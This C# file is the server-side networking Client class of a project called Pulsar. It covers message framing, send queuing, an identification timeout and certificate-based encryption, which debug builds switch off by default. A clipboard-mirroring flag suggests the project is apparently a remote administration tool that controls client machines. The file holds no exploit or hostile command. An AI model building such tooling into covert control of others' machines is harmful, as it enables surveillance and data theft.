using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Forms;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Pulsar.Server.Networking
{
    public class Client : IEquatable<Client>, ISender
    {
        /// <summary>
        /// Occurs as a result of an unrecoverable issue with the client.
        /// </summary>
        public event ClientFailEventHandler ClientFail;

        /// <summary>
        /// Represents a method that will handle failure of the client.
        /// </summary>
        /// <param name="s">The client that has failed.</param>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        public delegate void ClientFailEventHandler(Client s, Exception ex);

        /// <summary>
        /// Fires an event that informs subscribers that the client has failed.
        /// </summary>
        /// <param name="ex">The exception containing information about the cause of the client's failure.</param>
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        /// <summary>
        /// Occurs when the state of the client changes.
        /// </summary>
        public event ClientStateEventHandler ClientState;

        /// <summary>
        /// Represents the method that will handle a change in a client's state.
        /// </summary>
        /// <param name="s">The client which changed its state.</param>
        /// <param name="connected">The new connection state of the client.</param>
        public delegate void ClientStateEventHandler(Client s, bool connected);

        /// <summary>
        /// Fires an event that informs subscribers that the state of the client has changed.
        /// </summary>
        /// <param name="connected">The new connection state of the client.</param>
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);

            if (connected)
            {

            }
        }

        /// <summary>
        /// Occurs when a message is received from the client.
        /// </summary>
        public event ClientReadEventHandler ClientRead;

        /// <summary>
        /// Represents the method that will handle a message received from the client.
        /// </summary>
        /// <param name="s">The client that has received the message.</param>
        /// <param name="message">The message that received by the client.</param>
        /// <param name="messageLength">The length of the message.</param>
        public delegate void ClientReadEventHandler(Client s, IMessage message, int messageLength);

        /// <summary>
        /// Fires an event that informs subscribers that a message has been
        /// received from the client.
        /// </summary>
        /// <param name="message">The message that received by the client.</param>
        /// <param name="messageLength">The length of the message.</param>
        private void OnClientRead(IMessage message, int messageLength)
        {
            Debug.WriteLine($"[SERVER] Received {message.GetType().Name} ({messageLength} bytes).");
            var handler = ClientRead;
            handler?.Invoke(this, message, messageLength);
        }

        public static bool operator ==(Client c1, Client c2)
        {
            if (ReferenceEquals(c1, null))
                return ReferenceEquals(c2, null);

            return c1.Equals(c2);
        }

        public static bool operator !=(Client c1, Client c2)
        {
            return !(c1 == c2);
        }

        /// <summary>
        /// Checks whether the clients are equal.
        /// </summary>
        /// <param name="other">Client to compare with.</param>
        /// <returns>True if equal, else False.</returns>
        public bool Equals(Client other)
        {
            if (ReferenceEquals(null, other)) return false;
            if (ReferenceEquals(this, other)) return true;

            try
            {
                return EndPoint.Equals(other.EndPoint);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public override bool Equals(object obj)
        {
            return this.Equals(obj as Client);
        }

        /// <summary>
        /// Returns the hashcode for this instance.
        /// </summary>
        /// <returns>A hash code for the current instance.</returns>
        public override int GetHashCode()
        {
            return this.EndPoint.GetHashCode();
        }

        /// <summary>
        /// The stream used for communication.
        /// </summary>
        private Stream _stream;
        private readonly X509Certificate2 _serverCertificate;
        private readonly bool _encryptTraffic;

        readonly object _readMessageLock = new object();
        readonly object _sendMessageLock = new object();
        readonly object _sendQueueLock = new object();
        readonly object _proxyClientsLock = new object();

        /// <summary>
        /// The buffer for the client's incoming payload.
        /// </summary>
        private byte[] _readBuffer;

        /// <summary>
        /// The queue which holds messages to send.
        /// </summary>
        private const int MaxQueuedMessages = 256;
        private readonly ConcurrentQueue<PendingSend> _sendBuffers = new ConcurrentQueue<PendingSend>();
        private int _queuedMessageCount;
        private int _sendPumpGeneration;
        private Timer _identificationTimer;
        private int _disconnecting;
        private bool _identified;

        /// <summary>
        /// Determines if the client is currently sending messages.
        /// </summary>
        private int _sendingMessagesFlag;

        // Receive info
        private int _readOffset;
        private int _readLength;

        /// <summary>
        /// The time when the client connected.
        /// </summary>
        public DateTime ConnectedTime { get; }

        /// <summary>
        /// The connection state of the client.
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        /// Determines if the client is identified.
        /// </summary>
        public bool Identified
        {
            get { return _identified; }
            set
            {
                _identified = value;
                if (value)
                {
                    try { _identificationTimer?.Dispose(); } catch { }
                    _identificationTimer = null;
                }
            }
        }

        /// <summary>
        /// Stores values of the user.
        /// </summary>
        public UserState Value { get; set; }

    /// <summary>
    /// Indicates whether this client currently allows clipboard mirroring to the server host.
    /// </summary>
    public bool ClipboardSyncEnabled { get; set; }

        /// <summary>
        /// The Endpoint which the client is connected to.
        /// </summary>
        public IPEndPoint EndPoint { get; }

        /// <summary>
        /// The header size in bytes.
        /// </summary>
        private const int HEADER_SIZE = 4;  // 4 B

        public Client(Stream stream, IPEndPoint endPoint, X509Certificate2 serverCertificate)
        {
            try
            {
                Identified = false;
                Value = new UserState();
                EndPoint = endPoint;
                ConnectedTime = DateTime.UtcNow;
                _stream = stream ?? throw new ArgumentNullException(nameof(stream));
                _serverCertificate = serverCertificate ?? throw new ArgumentNullException(nameof(serverCertificate));
                if (_stream.CanTimeout)
                {
                    _stream.ReadTimeout = 30000;
                    _stream.WriteTimeout = 10000;
                }

#if DEBUG
                var certificateUsable = SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
                var enforceEncryptionFlag = Environment.GetEnvironmentVariable("PULSAR_DEBUG_ENFORCE_ENCRYPTION");
                var enforceEncryption = !string.IsNullOrWhiteSpace(enforceEncryptionFlag)
                    && (enforceEncryptionFlag.Equals("1", StringComparison.OrdinalIgnoreCase)
                        || enforceEncryptionFlag.Equals("true", StringComparison.OrdinalIgnoreCase)
                        || enforceEncryptionFlag.Equals("yes", StringComparison.OrdinalIgnoreCase));

                if (enforceEncryption && certificateUsable)
                {
                    _encryptTraffic = true;
                    Debug.WriteLine("[SERVER] Debug build: encryption enforced via PULSAR_DEBUG_ENFORCE_ENCRYPTION.");
                }
                else
                {
                    _encryptTraffic = false;
                    if (!certificateUsable)
                    {
                        Debug.WriteLine("[SERVER] Debug build: server certificate unavailable, running without encryption.");
                    }
                    else
                    {
                        var logMessage = enforceEncryption
                            ? "[SERVER] Debug build: encryption enforcement requested but certificate cannot be used; continuing without encryption."
                            : "[SERVER] Debug build: encryption disabled by default for development.";
                        Debug.WriteLine(logMessage);
                    }
                }
#else
                _encryptTraffic = SecureMessageEnvelopeHelper.CanUse(_serverCertificate);
                if (!_encryptTraffic)
                {
                    throw new InvalidOperationException("A valid server certificate is required for secure communication.");
                }
#endif

                _readBuffer = new byte[HEADER_SIZE];
                _readOffset = 0;
                _readLength = HEADER_SIZE;
                _identificationTimer = new Timer(_ =>
                {
                    if (!Identified)
                    {
                        Disconnect();
                    }
                }, null, TimeSpan.FromSeconds(30), Timeout.InfiniteTimeSpan);
                _stream.BeginRead(_readBuffer, _readOffset, _readBuffer.Length, AsyncReceive, null);
                OnClientState(true);
            }
            catch (Exception ex)
            {
                Disconnect();
                OnClientFail(ex);
            }
        }

        private void AsyncReceive(IAsyncResult result)
        {
            try
            {
                if (_stream == null)
                {
                    return;
                }

                var bytesRead = _stream.EndRead(result);
                if (bytesRead <= 0)
                    throw new Exception("no bytes transferred");

                lock (_readMessageLock)
                {
                    _readOffset += bytesRead;
                    _readLength -= bytesRead;

                    if (_readLength == 0)
                    {
                        if (_readBuffer.Length == HEADER_SIZE)
                        {
                            var length = BitConverter.ToInt32(_readBuffer, 0);
                            MessageInputLimits.ValidateFrameLength(length);

                            _readBuffer = new byte[length];
                            _readOffset = 0;
                            _readLength = length;
                        }
                        else
                        {
                            try
                            {
                                var message = PulsarMessagePackSerializer.Deserialize(_readBuffer);
                                message = ProcessIncomingMessage(message);
                                OnClientRead(message, _readBuffer.Length);
                            }
                            finally
                            {
                                _readBuffer = new byte[HEADER_SIZE];
                                _readOffset = 0;
                                _readLength = HEADER_SIZE;
                            }
                        }
                    }

                }

                if (_stream != null)
                {
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            if (_stream != null)
                            {
                                _stream.BeginRead(_readBuffer, _readOffset, _readLength, AsyncReceive, result.AsyncState);
                            }
                        }
                        catch (Exception ex)
                        {
                            Disconnect();
                            OnClientFail(ex);
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Disconnect();
                OnClientFail(ex);
            }
        }

        /// <summary>
        /// Sends a message to the connected client.
        /// </summary>
        /// <typeparam name="T">The type of the message.</typeparam>
        /// <param name="message">The message to be sent.</param>
        public void Send<T>(T message) where T : IMessage
        {
            TrySend(message);
        }

        /// <summary>
        /// Queues a message if the client connection can currently accept it.
        /// </summary>
        /// <returns><see langword="true"/> when the message was accepted by the send queue.</returns>
        public bool TrySend<T>(T message) where T : IMessage
        {
            lock (_sendQueueLock)
            {
                if (!Connected || message == null) return false;

                var pending = new PendingSend(message);
                if (!Enqueue(pending))
                    return false;
                if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
                {
                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers, Volatile.Read(ref _sendPumpGeneration));
                }
                return true;
            }
        }

        /// <summary>
        /// Sends a message to the connected client.
        /// Blocks the thread until the message has been sent.
        /// </summary>
        /// <typeparam name="T">The type of the message.</typeparam>
        /// <param name="message">The message to be sent.</param>
        public void SendBlocking<T>(T message) where T : IMessage
        {
            if (!Connected || message == null) return;

            var pending = new PendingSend(message, new ManualResetEventSlim(false));
            lock (_sendQueueLock)
            {
                if (!Connected || !Enqueue(pending))
                    return;
                if (Interlocked.Exchange(ref _sendingMessagesFlag, 1) == 0)
                    ThreadPool.QueueUserWorkItem(ProcessSendBuffers, Volatile.Read(ref _sendPumpGeneration));
            }
            pending.Completed.Wait();
        }

        private bool Enqueue(PendingSend pending)
        {
            if (!Connected)
            {
                pending.Complete();
                Disconnect();
                return false;
            }

            if (Interlocked.Increment(ref _queuedMessageCount) > MaxQueuedMessages)
            {
                Interlocked.Decrement(ref _queuedMessageCount);
                pending.Complete();
                Disconnect();
                return false;
            }

            _sendBuffers.Enqueue(pending);
            return true;
        }

        /// <summary>
        /// Safely sends a message and prevents multiple simultaneous
        /// write operations on the <see cref="_stream"/>.
        /// </summary>
        /// <param name="message">The message to send.</param>
        private void SafeSendMessage(IMessage message)
        {
            try
            {
                Debug.WriteLine($"[SafeSendMessage] Starting send for message type: {message?.GetType().Name}");
                lock (_sendMessageLock)
                {
                    if (_stream == null)
                        return;

                    var prepared = PrepareMessageForSend(message);
                    if (prepared == null)
                        return;

                    var payload = PulsarMessagePackSerializer.Serialize(prepared);
                    int totalLength = HEADER_SIZE + payload.Length;
                    var buffer = System.Buffers.ArrayPool<byte>.Shared.Rent(totalLength);
                    try
                    {
                        System.Buffers.Binary.BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(buffer, 0, HEADER_SIZE), payload.Length);
                        Buffer.BlockCopy(payload, 0, buffer, HEADER_SIZE, payload.Length);
                        _stream.Write(buffer, 0, totalLength);
                    }
                    finally
                    {
                        System.Buffers.ArrayPool<byte>.Shared.Return(buffer, clearArray: false);
                    }
                }
            }
            catch (Exception ex)
            {
                OnClientFail(ex);
                Disconnect();
            }
        }

        private void ProcessSendBuffers(object state)
        {
            int generation = state is int value ? value : -1;
            while (true)
            {
                if (generation != Volatile.Read(ref _sendPumpGeneration))
                    return;

                if (!Connected)
                {
                    SendCleanup(true);
                    return;
                }

                if (!_sendBuffers.TryDequeue(out var pending))
                {
                    lock (_sendQueueLock)
                    {
                        if (generation != Volatile.Read(ref _sendPumpGeneration))
                            return;

                        if (!_sendBuffers.IsEmpty && Connected)
                            continue;

                        Interlocked.Exchange(ref _sendingMessagesFlag, 0);
                        return;
                    }
                }

                Interlocked.Decrement(ref _queuedMessageCount);
                if (generation != Volatile.Read(ref _sendPumpGeneration))
                {
                    pending.Complete();
                    return;
                }

                try { SafeSendMessage(pending.Message); }
                finally { pending.Complete(); }
            }
        }

        private void SendCleanup(bool clear = false)
        {
            lock (_sendQueueLock)
            {
                if (clear)
                {
                    while (_sendBuffers.TryDequeue(out var pending))
                    {
                        Interlocked.Decrement(ref _queuedMessageCount);
                        pending.Complete();
                    }
                }
                Interlocked.Exchange(ref _sendingMessagesFlag, 0);
            }
        }

        private IMessage PrepareMessageForSend(IMessage message)
        {
            if (message == null)
            {
                return null;
            }

            if (message is SecureMessageEnvelope)
            {
                return message;
            }

            if (!_encryptTraffic)
            {
                Debug.WriteLine("[PrepareMessageForSend] Encryption disabled, returning plaintext");
                return message;
            }

            Debug.WriteLine($"[PrepareMessageForSend] Attempting to wrap message in secure envelope, _encryptTraffic={_encryptTraffic}");
            
            if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
            {
                Debug.WriteLine("[PrepareMessageForSend] Certificate cannot be used, throwing exception");
                throw new InvalidOperationException("Secure transport is enabled but the server certificate is unavailable.");
            }

            Debug.WriteLine("[PrepareMessageForSend] Certificate OK, calling Wrap()");
            return SecureMessageEnvelopeHelper.Wrap(message, _serverCertificate);
        }

        private IMessage ProcessIncomingMessage(IMessage message)
        {
            if (message is SecureMessageEnvelope secureEnvelope)
            {
                if (!SecureMessageEnvelopeHelper.CanUse(_serverCertificate))
                {
                    throw new InvalidOperationException("Received a secure envelope but the server certificate is unavailable for decryption.");
                }

                return SecureMessageEnvelopeHelper.Unwrap(secureEnvelope, _serverCertificate);
            }

            // ALLOW plaintext ClientIdentification during initial handshake (before encryption is established)
            if (message is ClientIdentification)
            {
                return message;
            }

            if (_encryptTraffic)
            {
                throw new InvalidOperationException($"Received unexpected plaintext message of type {message?.GetType().Name} while encryption is enforced.");
            }

            return message;
        }

        /// <summary>
        /// Disconnect the client from the server and dispose of
        /// resources associated with the client.
        /// </summary>
        public void Disconnect()
        {
            if (Interlocked.Exchange(ref _disconnecting, 1) == 1)
                return;

            try { _identificationTimer?.Dispose(); } catch { }
            _identificationTimer = null;

            if (_stream != null)
            {
                _stream.Dispose();
                _stream = null;
            }

            _readBuffer = new byte[HEADER_SIZE];
            _readOffset = 0;
            _readLength = HEADER_SIZE;

            lock (_sendQueueLock)
            {
                Interlocked.Increment(ref _sendPumpGeneration);
                OnClientState(false);
                while (_sendBuffers.TryDequeue(out var pending))
                {
                    Interlocked.Decrement(ref _queuedMessageCount);
                    pending.Complete();
                }
                Interlocked.Exchange(ref _sendingMessagesFlag, 0);
            }
        }

        private sealed class PendingSend
        {
            public readonly IMessage Message;
            public readonly ManualResetEventSlim Completed;

            public PendingSend(IMessage message, ManualResetEventSlim completed = null)
            {
                Message = message;
                Completed = completed;
            }

            public void Complete() => Completed?.Set();
        }
    }
}
